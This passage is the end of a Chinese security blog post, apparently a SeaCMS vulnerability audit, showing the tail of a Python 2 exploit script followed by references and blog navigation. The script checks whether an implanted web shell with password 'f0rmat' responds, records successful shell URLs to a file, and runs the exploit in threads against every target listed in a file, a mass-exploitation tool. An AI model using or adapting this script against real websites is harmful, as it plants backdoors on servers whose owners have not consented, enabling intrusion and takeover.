        <span class="k">if</span> <span class="s2">&#34;f0rmat&#34;</span> <span class="ow">in</span> <span class="n">verify</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="k">print</span> <span class="s1">&#39;Write success,shell url:&#39;</span><span class="p">,</span><span class="n">shell</span><span class="p">,</span><span class="s1">&#39;pass:f0rmat&#39;</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;success.txt&#34;</span><span class="p">,</span><span class="s2">&#34;a+&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">shell</span><span class="o">+</span><span class="s1">&#39;  pass:f0rmat&#39;</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">print</span> <span class="n">target</span><span class="p">,</span><span class="s1">&#39;Write failure!&#39;</span>
    <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
        <span class="k">print</span> <span class="n">e</span>
<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&lt;</span><span class="mi">3</span><span class="p">:</span>
        <span class="k">print</span> <span class="s1">&#39;python check_order.py.py -h target/-f target-file&#39;</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;-h&#34;</span><span class="p">:</span>
            <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
        <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;-f&#34;</span><span class="p">:</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
                <span class="n">b</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
                <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
                    <span class="k">if</span> <span class="ow">not</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">:</span>
                        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">exploit</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(),))</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>



<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div><h1 id="结束">结束</h1>
<p>审计这个洞，真的累，可能就是因为太菜了吧，哈哈。</p>
<h1 id="参考">参考</h1>
<p>源码下载地址：https://pan.lanzou.com/i0l0leb</p>
<p><a href="http://blog.csdn.net/pygain/article/details/56016227">http://blog.csdn.net/pygain/article/details/56016227</a></p>
<p><a href="http://php.net/docs.php">http://php.net/docs.php</a></p>
<p><a href="https://github.com/F0r3at/Python-Tools/tree/master/seacms">https://github.com/F0r3at/Python-Tools/tree/master/seacms</a></p>
<p><a href="http://0day5.com/archives/4249/">http://0day5.com/archives/4249/</a></p>

    </article>

    
    <div class="prevnext">
        



<ul class="prevnext">
    
    <li>上一篇：
        <a href="https://getshe11.com/post/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/">
            通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)
        </a>
    </li>
    
    
    <li>下一篇：
        <a href="https://getshe11.com/post/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/">
            SeaCMS V6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)
        </a>
    </li>
    
</ul>

    </div>
    
    <div class="post-comments">
        
  
  

  
    <script src="https://utteranc.es/client.js"
            repo="F0r3at/Getshe11.com"
            issue-term="pathname"
            theme="github-light"
            crossorigin="anonymous"
            async>
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>

    </div>
</div>
            </div>
            
            <div class="col-second">
                <div class="col-box col-box-author">
    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
    <div class="col-box-title name">F0rmat</div>
    <p>Stay Hungry, Stay Foolish.</p>
    <p class="contact">
        <a href="http://github.com/F0r3at">Github</a>
    </p>
</div>

<div class="col-box">
    <div class="col-box-title">Newest Posts</div>
    <ul class="post-list">
        
        <li>
            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
        </li>
        
        <li>
            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
        </li>
        
    </ul>
</div>

<div class="col-box post-toc hide">
    <div class="col-box-title">TOC</div>
</div>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <div class="wrapper">
    © 2021    <a href="https://getshe11.com">F0rmat</a>
</div>
    </footer>
    
    
<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>

<script src="/js/easybook.js"></script>

<script src="/js/lazysizes.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
<script src="/js/figure.js"></script>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-XXXXXXXX-X', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>






</body>

</html>